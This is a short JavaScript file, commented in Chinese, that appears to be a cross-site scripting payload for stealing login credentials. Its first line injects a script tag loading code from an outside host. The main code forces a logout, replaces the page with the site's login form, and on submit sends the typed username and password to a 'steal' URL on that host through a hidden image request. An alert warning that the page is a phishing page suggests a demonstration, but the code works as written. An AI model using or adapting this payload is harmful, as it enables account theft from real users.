
//<a style='display:none'>";var d=document;s=d.createElement('script');s.src='http://lovearia.me/t.js';d.head.appendChild(s);"<\a>

var timer = setInterval(function(){
  if (!!window.jQuery){
    clearInterval(timer);

    //return;
      //if (localStorage['islogin'] === 'true'){
        //return;
      //}

      // 设置退出登录页面和登录页面
      var logoutpage = '/user/logout/';
      var loginpage = '/user/login/';

      // 登录页面的表单选择器
      var loginformselector = 'form[action="/user/login/"]';

      // 登录页面中用户名密码的选择器
      var usernameselector = 'input[name="name"]';
      var passwordselector = 'input[name="password"]';

      // 接受偷取用户名密码的URL
      var receiveurl = 'http://lovearia.me/main/steal/';

      // 首先，用Ajax强制退出用户的登录
      $.get(logoutpage, function(){

        // 然后，用Ajax获取登录页面并且覆盖当前页面
        // 注意：此处不会跳转URL
        $.get(loginpage, function(d){
          $('html').html(d);
          alert('这是钓鱼登录页面，别输入帐号密码了');

          // 当用户提交登录表单的时候，获取用户名密码，并且传输给服务器
          $(loginformselector).on('submit', function(e){
            e.preventDefault();
            var username = $(usernameselector).val();
            var password = $(passwordselector).val();
            var img = $('<img>');
            img.attr('src', receiveurl + username + '/' + password);
            img.css('display', 'none');
            img.on('error', function(){
              //localStorage['islogin'] = 'true';
              $(loginformselector).off('submit');
              $(loginformselector).trigger('submit');
            });
            // 这里通过图片传输数据来避免跨域问题
            $('body').append(img);
          });
        });
      });

  }
}, 500);

